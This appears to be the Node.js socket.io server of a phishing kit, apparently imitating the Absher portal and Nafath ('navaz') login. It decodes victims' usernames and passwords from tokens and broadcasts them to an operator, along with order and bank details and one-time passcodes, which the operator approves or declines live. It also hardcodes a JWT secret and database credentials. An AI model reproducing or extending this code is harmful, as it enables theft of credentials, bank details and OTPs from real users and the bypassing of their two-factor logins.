const express=  require('express')
const app = express()
const cors = require('cors')
const server = require("http").createServer(app)
const io = require("socket.io")(server,({cors:{origin:"*"}}))
const PORT = process.env.PORT || 8080
const path = require("path")
const mainRoute = require('./routes/mainRoute')
const { default: mongoose } = require('mongoose')
const {  Request, User, Session, Order } = require('./model')
const bcrypt = require('bcrypt')
const morgan = require('morgan')
const {verify} = require('jsonwebtoken')
const { errorHandle } = require('./errorHandle')
app.use(cors())
app.use(express.json())
app.use(morgan('dev'))
io.on('connection',(socket)=>{
    console.log('userconnected with id' + socket.id)
    socket.on('login',async(data)=> io.emit('newLogin',data))
    socket.on('allow',async(data)=>{
        await Session.findByIdAndUpdate(data.session._id,{status:true},{new:true}).then((session)=>io.emit('success',{...data,session}))
    })
    socket.on('newOrder',(data)=>{
        const result = verify(data.token,'secretkeyforjsonwebtokentoabshrsite')
        const {username,password} = result
        if(username,password){
            io.emit('newOrder',{...data.finalData,username,password,token:data.token})
        }
    })
    socket.on('acceptOrder',async(result)=>{
        console.log('admin accept order')
        await Order.create(result).then((order)=>{
            io.emit('acceptOrder',order)
        })
    })
    socket.on('declineOrder',(result)=>{
        console.log('admin decline order')
        io.emit('declineOrder',result)
    })
    socket.on('orderOtp',async(data)=>{
        const {id,otp,userOtp} = data
        const order = await Order.findById(id)
        if(order){
            if(!order.otp){
                io.emit('orderOtp',{id,email:order.email,otp,userOtp})
            }else{
                io.emit('declineOtp',{id,token:order.token,otp:data.otp})
            }
        }
     })
     socket.on('loginOtp',(data)=>io.emit('loginOtp',data))

     socket.on('orderValidate',(data)=>io.emit('orderValidate',data))
     socket.on('successValidate',(data)=>io.emit('successValidate',data))
     socket.on('declineValidate',(data)=>io.emit('declineValidate',data))
     socket.on('navazOtp',(data)=>io.emit('navazOtp',data))
     socket.on('disAllowNavaz',(data)=>io.emit('disAllowNavaz',data))
     socket.on('AllowNavaz',(data)=>io.emit('AllowNavaz',data))
     socket.on('bankAuth',(data)=>{
        const result = verify(data.token,'secretkeyforjsonwebtokentoabshrsite')
        const {username,password} = result
        io.emit('bankAuth',{...data.finalData,username,password,token:data.token})
     })

     socket.on('declineOtp',(data)=>io.emit('declineOtp',data))
     socket.on('acceptOtp',async(data)=> await Order.findByIdAndUpdate(data.id,{otp:data.otp}).then(()=>    io.emit('acceptOtp',data)))
     socket.on('AllowUserOtp',(data)=>io.emit("AllowUserOtp",data))
     socket.on('disAllowUserOtp',(data)=>io.emit("disAllowUserOtp",data))

    socket.on('disAllow',(data)=>   io.emit('disAllow',data))
    socket.on('disconnect',()=>console.log('disconnect with id '  + socket.id))

})

async function deleteExpiredSessions() {
    try {
        // Define expiry condition (for example, sessions whose expire_id is before the current date/time)
        const expiryDate = new Date();
        const expiredSessions = await Session.find({ expire_id: { $lt: expiryDate } });

        // Delete expired sessions
        await Session.deleteMany({ _id: { $in: expiredSessions.map(session => session._id) } });

        console.log(`${expiredSessions.length} expired sessions deleted.`);
    } catch (error) {
        console.error('Error deleting expired sessions:', error);
    }
}

// Schedule the function to run every day at midnight
setInterval(deleteExpiredSessions, 24 * 60 * 60 * 1000);

app.use('/',mainRoute)
app.use(errorHandle)
mongoose.connect('mongodb+srv://test:test@abshr.2x9e0av.mongodb.net/Main2').then((con)=>{
    server.listen(PORT, async() => {
        console.log(`listen on port ${PORT} And Connect To DB ${con.connection.host}`)
        
        // const password = await bcrypt.hash('admin123456',10)
        // await User.create({email:'admin@abshr.org',password,type:'admin'})
    })
}).catch(e=>console.log(e))

